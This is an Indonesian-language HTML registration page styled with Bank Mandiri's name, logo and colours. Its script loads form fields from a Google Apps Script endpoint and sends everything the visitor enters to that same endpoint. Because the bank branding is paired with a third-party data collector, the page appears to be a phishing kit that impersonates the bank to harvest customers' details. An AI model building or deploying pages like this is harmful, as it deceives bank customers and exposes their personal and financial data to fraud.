<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Formulir Pendaftaran</title>
<style>
  :root {
    color-scheme: light;
    --mandiri-blue: #003D79;
    --mandiri-blue-dark: #002850;
    --mandiri-gold: #FFC72C;
  }
  * { box-sizing: border-box; }
  body {
    font-family: -apple-system, "Segoe UI", Roboto, Arial, sans-serif;
    background: #eef3f8;
    margin: 0;
    padding: 0 0 60px;
    color: #1f2937;
  }
  .brand-header {
    background: var(--mandiri-blue);
    border-bottom: 4px solid var(--mandiri-gold);
    padding: 16px;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 10px;
  }
  .brand-header img { height: 34px; }
  .brand-header .brand-name {
    color: #fff;
    font-weight: 700;
    font-size: 1.1rem;
    letter-spacing: 0.3px;
  }
  .card {
    max-width: 480px;
    margin: 24px auto 0;
    background: #fff;
    border-radius: 14px;
    padding: 28px 22px;
    box-shadow: 0 2px 12px rgba(0,0,0,0.06);
    border-top: 4px solid var(--mandiri-gold);
  }
  h1 {
    font-size: 1.35rem;
    margin: 0 0 6px;
    color: var(--mandiri-blue-dark);
  }
  .sub { color: #64748b; font-size: 0.9rem; margin-bottom: 22px; }
  label {
    display: block;
    font-size: 0.88rem;
    font-weight: 600;
    margin: 16px 0 6px;
    color: #334155;
  }
  label .req { color: #dc2626; }
  input, textarea, select {
    width: 100%;
    padding: 10px 12px;
    border: 1px solid #d1d5db;
    border-radius: 8px;
    font-size: 0.95rem;
    font-family: inherit;
  }
  input:focus, textarea:focus, select:focus {
    outline: none;
    border-color: var(--mandiri-blue);
    box-shadow: 0 0 0 3px rgba(255,199,44,0.35);
  }
  textarea { min-height: 90px; resize: vertical; }
  button {
    margin-top: 24px;
    width: 100%;
    padding: 13px;
    background: var(--mandiri-blue);
    color: #fff;
    border: none;
    border-radius: 9px;
    font-size: 1rem;
    font-weight: 600;
    cursor: pointer;
  }
  button:hover:not(:disabled) { background: var(--mandiri-blue-dark); }
  button:disabled { opacity: 0.6; }
  .msg {
    margin-top: 16px;
    padding: 12px;
    border-radius: 8px;
    font-size: 0.9rem;
    display: none;
  }
  .msg.ok { background: #dcfce7; color: #166534; display: block; }
  .msg.err { background: #fee2e2; color: #991b1b; display: block; }
</style>
</head>
<body>
  <header class="brand-header">
    <img src="logo-mandiri.png" alt="Bank Mandiri" onerror="this.style.display='none'">
    <span class="brand-name">Bank Mandiri</span>
  </header>
  <div class="card">
    <h1 id="formTitle">Memuat…</h1>
    <div class="sub" id="formDescription">Silakan lengkapi data di bawah ini.</div>
    <form id="regForm"></form>
    <div class="msg" id="msg"></div>
  </div>

<script>
const API_URL = "https://script.google.com/macros/s/AKfycbxUCNhyhDRDg-TVO7J9Z6iQrzO-OjA9Tt0kMHn-YA9QSOpL0oATn7TOIepqNrB7H9JBrA/exec";

async function loadForm() {
  const res = await fetch(API_URL + '?action=getForm');
  const data = await res.json();
  if (!data.ok) throw new Error(data.error || 'Gagal memuat formulir');
  const config = data.config;
  document.getElementById('formTitle').textContent = config.title;
  document.title = config.title;
  const form = document.getElementById('regForm');
  form.innerHTML = '';
  config.fields.forEach(f => {
    const label = document.createElement('label');
    label.textContent = f.label + ' ';
    if (f.required) {
      const span = document.createElement('span');
      span.className = 'req';
      span.textContent = '*';
      label.appendChild(span);
    }
    let input;
    if (f.type === 'textarea') {
      input = document.createElement('textarea');
    } else if (f.type === 'select') {
      input = document.createElement('select');
      const empty = document.createElement('option');
      empty.value = '';
      empty.textContent = '-- pilih --';
      input.appendChild(empty);
      (f.options || []).forEach(opt => {
        const o = document.createElement('option');
        o.value = opt;
        o.textContent = opt;
        input.appendChild(o);
      });
    } else {
      input = document.createElement('input');
      input.type = f.type || 'text';
    }
    input.name = f.id;
    if (f.required) input.required = true;
    form.appendChild(label);
    form.appendChild(input);
  });
  const btn = document.createElement('button');
  btn.type = 'submit';
  btn.textContent = 'Kirim Pendaftaran';
  form.appendChild(btn);
}

document.getElementById('regForm').addEventListener('submit', async (e) => {
  e.preventDefault();
  const form = e.target;
  const btn = form.querySelector('button');
  const msg = document.getElementById('msg');
  msg.className = 'msg';
  msg.textContent = '';
  const values = {};
  new FormData(form).forEach((v, k) => { values[k] = v; });
  btn.disabled = true;
  btn.textContent = 'Mengirim…';
  try {
    const res = await fetch(API_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'text/plain;charset=utf-8' },
      body: JSON.stringify({ action: 'submit', values })
    });
    const data = await res.json();
    if (!data.ok) throw new Error(data.error || 'Gagal mengirim');
    msg.className = 'msg ok';
    msg.textContent = 'Pendaftaran berhasil dikirim. Terima kasih!';
    form.reset();
  } catch (err) {
    msg.className = 'msg err';
    msg.textContent = err.message;
  } finally {
    btn.disabled = false;
    btn.textContent = 'Kirim Pendaftaran';
  }
});

loadForm().catch(err => {
  document.getElementById('formTitle').textContent = 'Gagal memuat formulir';
  const msg = document.getElementById('msg');
  msg.className = 'msg err';
  msg.textContent = err.message;
});
</script>
</body>
</html>
